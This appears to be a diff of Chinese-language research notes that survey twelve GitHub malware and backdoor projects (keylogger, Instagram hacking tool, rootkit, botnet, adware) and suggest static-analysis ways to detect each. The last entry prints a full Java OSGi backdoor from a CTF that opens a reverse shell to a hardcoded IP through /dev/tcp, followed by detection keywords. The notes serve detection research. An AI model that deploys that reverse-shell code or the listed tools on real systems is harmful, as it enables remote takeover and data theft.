@@ -1,4 +1,5 @@
-https://github.com/HouariZegai/SpyGen   (键盘记录器/截屏/网络摄像头捕捉)
+No.1 (键盘记录器/截屏/网络摄像头捕捉)
+https://github.com/HouariZegai/SpyGen  
 	
 1. **键盘记录功能（Keylogger）**：
    - `Keylogger.java` 和 `NativeKeyboard.java` 这两个文件显然与键盘记录有关。键盘记录器是木马中常见的功能之一，用于捕获用户的键盘输入（如密码、信用卡信息等）。
@@ -24,6 +25,7 @@ https://github.com/HouariZegai/SpyGen   (键盘记录器/截屏/网络摄像头�
 •	控制流图分析：构建代码的控制流图，分析代码的逻辑结构，识别可能的恶意行为模式。
 •	依赖分析：检测程序所依赖的库和外部模块（如 org.jnativehook, org.apache.commons.mail 等），以识别可能与木马行为相关的组件。
 
+No.2 Instagram Hacking Tool
 https://github.com/Th30neAnd0nly/PI  (Instagram Hacking Tool)
 
 `RequestNetworkController.java` 文件负责管理和执行网络请求，以下是对代码的简要分析：
@@ -44,7 +46,7 @@ AST 分析：使用 AST 分析工具遍历代码树，识别 TrustManager 的实
 ### 1.3 SSL 配置检测
 SSLContext 配置：扫描代码中是否存在 SSLContext 配置，尤其是 sslContext.init(null, trustAllCerts, new java.security.SecureRandom()); 这样的代码，它通常意味着信任所有 SSL 证书。
 
-
+No.3 trojan_virus
 https://github.com/sibivarman/trojan_virus
 
 `file_deleter.java` 文件定义了一个名为 `FileDeleter` 的类，其主要功能是删除文件。以下是对代码的简要分析：
@@ -74,6 +76,7 @@ https://github.com/sibivarman/trojan_virus
 递归与循环检测：分析代码的控制流，识别递归调用或循环结构，检查是否与批量文件操作相关联。
 变量追踪：追踪与文件操作相关的变量，检查这些变量是否被用于多次删除操作。
 
+No.4 Meteor客户端集成用于后门交互
 https://github.com/Dark-Developments/Ethanol-Meteor-Addon.git
 
 `EthanolSystem.java` 文件定义了一个名为 `EthanolSystem` 的类，以下是对代码的简要分析：
@@ -167,7 +170,7 @@ API 密钥和身份验证数据检测：使用字符串分析工具扫描代码�
 硬编码密钥检测：
 使用字符串分析工具扫描代码，检测是否存在硬编码的服务器密钥或敏感信息。这些硬编码信息可能被用作后门的一部分，允许攻击者绕过身份验证。
 
-
+No.5 RSABackdoor
 https://github.com/netcell-archive/ECC-RSA-Backdoor.git
 
 `RSA.java` 文件定义了一个 RSA 加密和解密的实现，并且包括一个名为 `Attack` 的方法，可能暗示了该代码中存在后门行为。以下是对代码的简要分析：
@@ -199,7 +202,7 @@ https://github.com/netcell-archive/ECC-RSA-Backdoor.git
 可以利用数据流分析工具（如Soo t）来追踪密钥在整个代码中的流向。
 
 
-
+No.6 nonobf服务器后门插件
 https://github.com/Acaiberii-archive/Bakdooro.git 
 键字与模式匹配
 关键字匹配：搜索可能暗示后门行为的关键字和模式，如 eval, Runtime.getRuntime().exec(), System.setProperty() 等，用于检测执行外部命令或动态加载类的代码。
@@ -228,7 +231,7 @@ https://github.com/Acaiberii-archive/Bakdooro.git
 1.2 字符串分析
 命令关键字检测：通过静态分析工具，扫描代码中的字符串，重点关注 "run " 和 "pos " 之类的字符串。结合代码上下文，判断这些字符串是否与命令执行或玩家定位相关。
 
-
+No.7 WebServerBackdoor
 https://github.com/omkartotade/Backdoor_Web_Server.git
 ### 功能描述：
 - **请求处理**：
@@ -254,7 +257,7 @@ HTTP 请求解析分析
 数据流跟踪：使用数据流分析工具（如 Soot 或类似工具）来跟踪用户输入数据（如 HTTP 请求参数）在代码中的流向，确保这些数据不会被直接用于执行系统命令。
 对解析出来的命令流向进行分析，判断是否被传递给 exec、Runtime 等执行函数。
 
-
+No.8 JavaRootKit
 https://github.com/Neraloth/java-rootkit.git
 
 `Client.java` 文件实现了一个用于发出 HTTP 请求的客户端程序，以下是对代码的简要分析：
@@ -279,7 +282,8 @@ https://github.com/Neraloth/java-rootkit.git
 命令和文件路径检测：扫描代码中的字符串，查找与系统文件路径访问和命令执行相关的关键字，如 /etc/passwd、rm、../ 等。
 
 
-广告软件https://github.com/paulpierre/provide_jar-android-malware-payload-06132018.git
+No.9广告软件
+https://github.com/paulpierre/provide_jar-android-malware-payload-06132018.git
 
 `BroadcastReceiverProvide.java` 文件实现了一个广播接收器类，用于监听特定的系统广播，并在网络连接变化时执行特定操作。以下是对代码的简要分析：
 
@@ -313,7 +317,8 @@ https://github.com/Neraloth/java-rootkit.git
 
 
 
-僵尸网络木马服务器https://github.com/Rayanox/Trojan-RB.git
+No.10 僵尸网络木马服务器:A botnet trojan project
+https://github.com/Rayanox/Trojan-RB.git
 
 `MenuRoute.java` 文件定义了一个名为 `MenuRoute` 的类，该类使用了 `Lombok` 库来简化构建器模式的实现。以下是对代码的简要分析：
 
@@ -337,3 +342,56 @@ https://github.com/Neraloth/java-rootkit.git
 通信接口检测：实现：扫描代码中涉及网络通信的部分，特别是与服务器进行的通信。这可能用于僵尸网络的命令与控制（C&C）通信。
 技术：搜索代码中对 Socket、HttpClient 等类的调用，检查这些通信是否用于接收或发送僵尸网络命令。
 
+
+No.11 QQMusicBackdoor :hook qq music back door
+https://github.com/lamster2018/QQMusicBackdoor.git
+
+qqmusic.java 文件是使用 Xposed 框架编写的，旨在挂钩并修改 QQ 音乐应用程序的行为。
+该文件尝试挂钩 IdentifyingCodeActivity 类的方法，表明它可能试图绕过或修改与验证码相关的功能，这是典型的后门行为。
+总结:
+qqmusic.java 文件中使用 Xposed 框架进行的方法挂钩显示了潜在的后门特征。它试图在 QQ 音乐应用程序中修改特定功能，这可能用于绕过某些验证或进行未授权的操作。
+这个文件可能就是后门代码的主要部分，而 MainActivity.java 仅是标准的应用入口。
+
+a. 分析 APK 文件
+解压 APK 文件，提取其中的 .dex 文件或 classes.dex 文件。
+反编译 .dex 文件，提取 Java 源代码或 smali 代码。
+b. 关键字搜索
+搜索可能涉及挂钩的关键类和方法，如 XposedBridge、IXposedHookLoadPackage、hookAllMethods 等。
+分析是否存在挂钩第三方应用（如 com.tencent.qqmusic）的代码。
+查找和分析所有调用 findClass 和 hookAllMethods 的代码，确定是否在未授权的情况下试图修改第三方应用的行为。
+c. 分析包名和类名
+检查代码中是否存在指向特定目标应用（如 com.tencent.qqmusic）的包名。
+分析代码是否试图挂钩特定的类或方法。
+
+No.12 osgi-bundle-backdoor : tctf中用到的osgi bundle后门，在start函数中触发反弹shell
+
+package com.osgi.helloworld.client;
+
+import org.osgi.framework.BundleActivator;
+import org.osgi.framework.BundleContext;
+
+public class Activator implements BundleActivator {
+    public void start(BundleContext ctx) {
+        try {
+            Runtime r = Runtime.getRuntime();
+            String[] mycmd = {"/bin/bash","-c","exec 5<>/dev/tcp/69.171.76.88/8888;cat <&5 | while read line; do $line 2>&5 >&5; done"};
+            Process p = r.exec(mycmd);
+            p.waitFor();
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void stop(BundleContext ctx) throws Exception {
+    }
+}
+
+这个代码片段显示，该程序在 start 方法中尝试使用 Runtime.getRuntime().exec() 方法执行一个命令。
+这个命令尝试通过 TCP 连接到 IP 地址 69.171.76.88 的端口 8888，并在连接成功后创建一个反向 shell，等待远程指令执行。
+这种行为非常典型，是后门程序的常见特征，允许攻击者通过远程访问控制受感染的系统
+
+关键字扫描:
+扫描代码文件中的关键字，例如：
+Runtime.getRuntime().exec()：这个方法经常用于执行系统命令，是检测的重点。
+/dev/tcp/：用于创建反向 shell 的命令。
+特定 IP 地址和端口号：任何硬编码的 IP 地址或端口号都应引起警觉。
